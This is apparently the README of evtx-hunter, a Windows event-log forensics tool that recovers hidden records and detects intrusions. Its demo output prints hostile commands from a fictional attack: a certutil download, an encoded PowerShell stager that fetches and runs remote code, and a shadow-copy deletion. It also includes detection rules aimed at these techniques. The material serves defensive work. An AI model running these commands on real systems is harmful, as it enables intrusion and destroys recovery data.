# evtx-hunter

**Hunt for attackers in Windows event logs.** A `.evtx` parser written from scratch and verified field-for-field against Windows' own decoder, 40 ATT&CK-mapped rules, 5 multi-event correlations, and log-tampering forensics that **recovers records an attacker hid from Windows**. Pure Python standard library: zero dependencies.

[](https://github.com/njuj/evtx-hunter/actions/workflows/ci.yml)


<p align="center"></p>

<p align="center"></p>

```text
$ evtx-hunter examples/demo

 evtx-hunter v0.1.0  ·  3 log(s)  ·  50 events  ·  2026-10-30 → 2026-10-30  ·  0.0s

 LOGS
   PowerShell-Operational.evtx         2 events  ✔ intact
   Security.evtx                      45 events  ✖ 2 hidden records recovered, 1 record missing
   System.evtx                         3 events  ✔ intact

 FINDINGS  (UTC timeline)
  2026-10-30 21:02:00  ✖ HIGH     Brute-force logon attempts                                 ×37  T1110.001  WS01.corp.example
                                  └ 37 failed logons for 'administrator' from 203.0.113.50 in 3m 36s (logon type 10)  (until 2026-10-30 21:05:36)
  2026-10-30 21:05:51  ✖ CRITICAL Brute force succeeded                                       T1110  WS01.corp.example
                                  └ 37 failed logons for 'administrator' from 203.0.113.50 in 3m 36s (logon type 10), then a successful logon for 'administrator' (type 10) at 21:05:51
  2026-10-30 21:05:51  ✖ HIGH     Event records missing from the middle of the log            T1070  Security.evtx
                                  └ 1 record removed: ids 143
  2026-10-30 21:05:51  • LOW      Remote Desktop logon                                        T1021.001  WS01.corp.example
                                  └ TargetUserName=administrator · TargetDomainName=WS01 · IpAddress=203.0.113.50
  2026-10-30 21:08:30  ✖ CRITICAL Records hidden inside other records (log tampering), recovered  T1070  Security.evtx
                                  └ 2 records invisible to Windows recovered from slack space: ids 144, 148; their findings are marked '(recovered)'
  2026-10-30 21:08:30  ✖ HIGH     certutil used to download or decode a file                  T1105 T1140  WS01.corp.example  [recovered: hidden from Windows]
                                  └ CommandLine=certutil.exe -urlcache -split -f http://203.0.113.50/t.exe C:\Users\Public\t.exe · SubjectUserName=administrator
  2026-10-30 21:09:05  ⚠ MEDIUM   Local or domain user account created                        T1136.001  WS01.corp.example
                                  └ TargetUserName=support · TargetDomainName=WS01 · SubjectUserName=administrator
  2026-10-30 21:09:40  ✖ CRITICAL New account added straight to a privileged group            T1136.001 T1098  WS01.corp.example
                                  └ 'support' created by 'administrator', then added to 'Administrators' 35s later
  2026-10-30 21:09:40  ✖ HIGH     Account added to a privileged group                         T1098  WS01.corp.example
                                  └ MemberName=- · MemberSid=S-1-5-21-1004336348-1177238915-682003330-1107 · TargetUserName=Administrators · SubjectUserName=administrator
  2026-10-30 21:11:02  ✖ HIGH     Service installed with a suspicious command                 T1543.003 T1569.002  WS01.corp.example
                                  └ ServiceName=WinSysUpd · ImagePath=%COMSPEC% /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAa... · AccountName=LocalSystem · decoded=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')
  2026-10-30 21:12:30  ⚠ MEDIUM   PowerShell started with an encoded command                  T1059.001 T1027  WS01.corp.example
                                  └ CommandLine=powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKA... · SubjectUserName=administrator · decoded=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')
  2026-10-30 21:12:40  ✖ HIGH     PowerShell downloads code and executes it in memory         T1059.001 T1105  WS01.corp.example
                                  └ ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')
  2026-10-30 21:15:00  ✖ CRITICAL Shadow copies or recovery deleted (ransomware precursor)    T1490  WS01.corp.example  [recovered: hidden from Windows]
                                  └ CommandLine=vssadmin.exe delete shadows /all /quiet · SubjectUserName=administrator
  2026-10-30 21:16:20  ✖ HIGH     Event log cleared                                           T1070.001  WS01.corp.example
                                  └ SubjectUserName=administrator · Channel=Windows PowerShell

 4 critical  ·  7 high  ·  2 medium  ·  1 low  ·  ATT&CK: T1021.001 T1027 T1059.001 T1070 T1070.001 T1098 T1105 T1110 T1110.001 T1136.001 T1140 T1490 T1543.003 T1569.002
```

That is a fictional intrusion ([`examples/demo`](examples/demo), real `.evtx` files that also open in Event Viewer): an RDP brute force from a TEST-NET address, a successful logon, a tool download, a backdoor account promoted to Administrators, a service that hides an encoded stager, shadow copies deleted, a log cleared. Then the cover-up. One record was **deleted** (the gap at 143) and two were **hidden** inside their neighbours, eventlogedit-style. Event Viewer shows 45 events and no sign of the `certutil` download or the `vssadmin` command. evtx-hunter recovers both, and they still trip their rules.

## Verified against Windows itself

A parser is only as good as its agreement with the real thing, so the test suite compares evtx-hunter, event by event and field by field, with `wevtutil qe /f:xml`, which is Windows' own decoder.

| Real log (Windows 11 workstation) | Events | Fields + values compared | Differences |
|---|---:|---:|---:|
| System | 35,245 | 444,354 | **0** |
| Application | 29,253 | 318,221 | **0** |
| Microsoft-Windows-PowerShell/Operational | 8,468 | 75,434 | **0** |
| Windows PowerShell | 6,774 | 81,288 | **0** |
| Microsoft-Windows-Windows Defender/Operational | 11,872 | 332,550 | **0** |
| **Total** | **91,612** | **1,251,847** | **0** |

The first run of that comparison found 47,000 differences. Each one taught something about how Windows actually renders events:

- **Array substitutions are not joined.** A `WString[]` value inside `<Data>` becomes *one `<Data>` element per item*, empty items included.
- **Strings end at the first NUL**, as in C. `wmiprvse.exe\0-Embedding` renders as `wmiprvse.exe`.
- **FILETIME is printed to 100 ns** (7 decimal places), and zero is the 1601 epoch, not empty.
- **GUID values in event data are lower case**, unlike most GUID displays.

The CI runs the same comparison on GitHub's `windows-latest` runners, against logs produced by the test suite's own writer **and** against the runner's real System log.

Building that writer turned up three more facts about the format that you only learn when Windows rejects your file:

- **Every record is padded to a multiple of 8 bytes.** This holds for all 91,612 real records.
- **Names carry a 16-bit hash, `h = h·65599 + c`**, checked against a real log (`Event` → `0x0CBA`).
- **Windows validates the chunk's record *numbers* but tolerates gaps in record *identifiers*.** That is what lets a tamperer delete records cleanly, and what evtx-hunter checks for.

## What it detects

| Area | Detections |
|---|---|
| **Log tampering** | records hidden in other records' slack space (**recovered and re-analysed**) · records deleted from the middle of a log (gaps in record ids) · chunk/header CRC32 mismatches · log cleared (1102, 104) |
| **Correlation** (many events) | brute force (N failures / 10 min per account+source), **brute force that succeeded**, password spraying (one source, many accounts), Kerberoasting (RC4 TGS requests for many services), new account added to a privileged group within 24 h |
| **Execution / LOLBins** (4688 or Sysmon 1) | certutil, bitsadmin, mshta, rundll32, regsvr32 (Squiblydoo), encoded PowerShell (**decoded inline**) |
| **Credential access** | LSASS dumps (comsvcs MiniDump, procdump), SAM/SECURITY hive saves, ntds.dit extraction, Sysmon 10 LSASS handle access, credential-tool commands in script blocks |
| **Persistence / lateral movement** | suspicious services (shell, script host, user-writable path), PsExec, suspicious scheduled tasks, RDP logons, pass-the-hash (logon type 9 via seclogo) |
| **Defense evasion** | Defender real-time protection off, exclusions added, Defender service disabled, AMSI bypass strings, PowerShell 2.0 downgrade |
| **Impact** | shadow copy / backup catalogue deletion, recovery disabled |
| **Defender** | malware detected and the action taken |

Every finding carries ATT&CK technique ids, repeats fold into one line with a count (`×37`), and anything that ran through `-EncodedCommand` is shown **decoded**.

## Calibrated on a real machine

On those same 91,612 real events evtx-hunter reports **10 findings, and every one is a real event**: Defender detections in Downloads, real-time protection switched off, a kernel driver loaded from `C:\Windows\Temp` (CPU-Z here, which is also the "bring your own vulnerable driver" pattern), and encoded PowerShell launches (an automation tool, decoded inline). Getting there took two changes:

- *"New service installed"* fired 189 times on a normal workstation (drivers, updaters). It is now `info`, and only services with a suspicious command line raise an alert.
- The encoded-PowerShell rule matched any `-e` inside a script body. It now requires an actual Base64 payload after the flag.

## Install

```bash
pip install git+https://github.com/njuj/evtx-hunter
```

## Usage

```bash
evtx-hunter Security.evtx                     # one log
evtx-hunter C:\cases\host01 -r                # every .evtx under a folder
evtx-hunter logs/ --since 2026-10-30 --until 2026-10-31
evtx-hunter logs/ --min-level high            # hide low / medium
evtx-hunter logs/ --json > findings.json      # for a SIEM or a notebook
evtx-hunter logs/ --csv timeline.csv          # for the case file
evtx-hunter logs/ --rules my-rules/           # add your own detections
```

**Exit codes:** `0` nothing at/above `--fail-on` (default `high`) · `1` findings · `2` error

Getting logs: `wevtutil epl Security C:\cases\Security.evtx` (needs admin for Security), or copy `C:\Windows\System32\winevt\Logs\*.evtx` from a mounted image. Never commit real logs: they contain host names, accounts and addresses (this repo's `.gitignore` refuses `*.evtx` outside the demo).

## Writing rules

```json
{
  "rules": [
    {
      "id": "lolbin-certutil-download",
      "title": "certutil used to download or decode a file",
      "level": "high",
      "mitre": ["T1105", "T1140"],
      "channels": ["Security", "Microsoft-Windows-Sysmon/Operational"],
      "event_ids": [4688, 1],
      "where": [["CommandLine|contains", ["certutil"]],
                ["CommandLine|contains", ["urlcache", "verifyctl", "-decode"]]],
      "where_not": [["ParentProcessName|endswith", ["\\msiexec.exe"]]],
      "show": ["CommandLine", "SubjectUserName"]
    }
  ]
}
```

Conditions in `where` are ANDed and the values in a list are ORed. Operators are `equals` (the default), `contains`, `startswith`, `endswith` and `re`, plus `|all` to require every value. `*` matches any data field, and `provider`, `computer`, `channel` and `user_sid` address the System section. A `show` entry can extract part of a field: `{"field": "Data_3", "extract": "HostApplication=([^\\r\\n]+)", "label": "HostApplication"}`. Rules are validated on load: bad regexes, unknown operators, duplicate ids and rules that would match everything all fail fast.

Rules for AMSI-bypass and credential-tool strings are written with character classes (`amsi[u]tils`), so the rule file never contains the literal strings antivirus engines quarantine.

## Layout

```
evtxhunter/
├── evtx.py        file/chunk/record reader, Binary XML + templates, value rendering, slack-space recovery
├── rules.py       rule engine, validation, inline PowerShell decoding
├── correlate.py   brute force, spraying, Kerberoasting, new-admin
├── hunter.py      orchestration, record-gap and checksum forensics, folding repeats
├── cli.py         timeline renderer, JSON/CSV, exit codes
└── rules/builtin.json
tests/
├── evtxwriter.py      writes real .evtx (templates, hashes, CRCs, eventlogedit-style hiding)
├── wevtutil_diff.py   field-by-field comparison with Windows' decoder
├── demo_story.py      the fictional intrusion in examples/demo
└── test_*.py          39 tests
```

```bash
python -m unittest discover -s tests -v
EVTXHUNTER_DIFF=1 python -m unittest discover -s tests -v   # + slow differential test on your own System log (Windows)
```

## Limitations and honest comparison

- **Hayabusa** and **Chainsaw** (Rust) are faster and ship thousands of Sigma rules; use them in production. evtx-hunter's value is different: a dependency-free parser you can read in an afternoon, proven against Windows field by field, with hidden-record recovery built into the same pass instead of left to a separate carving tool such as EVTXtract.
- About **6,000 events/second**, single-threaded: fine for a host, slow for a fleet.
- Rules are Sigma-*flavoured* JSON, not Sigma YAML (the standard library has no YAML parser).
- Correlations need the right audit policy: 4625 (failed logons), 4769 (Kerberos service tickets) and 4688 with command-line logging are off by default on many systems.
- Only `.evtx` files. Live channels, `.evt` (XP era) and ETW are out of scope.

---

<sub>built by <a href="https://github.com/njuj">kira</a> · trust nothing, verify everything, including the logs</sub>
